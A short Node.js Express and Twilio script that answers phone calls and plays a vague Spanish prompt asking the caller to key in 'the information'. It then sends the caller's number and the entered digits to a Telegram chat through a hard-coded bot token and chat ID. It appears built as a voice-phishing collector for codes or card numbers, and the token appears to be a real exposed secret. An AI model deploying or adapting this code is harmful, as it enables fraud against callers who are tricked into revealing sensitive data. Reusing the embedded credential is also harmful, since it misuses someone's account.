const express = require('express');
const twilio = require('twilio');
const axios = require('axios');
const app = express();
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = '7808638370:AAFH07f-wtu3LPC6jCKelIma40K5lekzYqM';
const TELEGRAM_CHAT_ID = '-5520488233';

// Cuando alguien llama
app.post('/voice', (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say({language: 'es-MX'}, 'Digite la información y presione numeral');
  twiml.gather({ input: 'dtmf', action: '/resultado' });
  res.type('text/xml');
  res.send(twiml.toString());
});

// Cuando marca
app.post('/resultado', async (req, res) => {
  const digits = req.body.Digits;
  const from = req.body.From;
  const mensaje = `📞 Llamada\nDe: ${from}\nDatos: ${digits}`;
  
  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    chat_id: TELEGRAM_CHAT_ID,
    text: mensaje
  });
  
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say({language: 'es-MX'}, 'Recibido');
  twiml.hangup();
  res.send(twiml.toString());
});

app.listen(3000, () => console.log('Bot prendido en puerto 3000'));
